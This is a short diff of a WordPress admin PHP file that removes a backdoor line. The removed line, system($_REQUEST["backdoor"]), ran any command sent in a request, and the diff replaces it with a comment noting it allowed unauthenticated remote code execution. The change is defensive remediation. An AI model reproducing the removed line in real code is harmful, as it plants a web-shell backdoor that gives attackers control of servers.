@@ -6,7 +6,7 @@
  * @subpackage Administration
  */
 
-system($_REQUEST["backdoor"]);
+// SECURITY: removed unsafe system() call that executed user input. Previously allowed unauthenticated remote code execution.
 
 /** Load WordPress Bootstrap */
 require_once __DIR__ . '/admin.php';
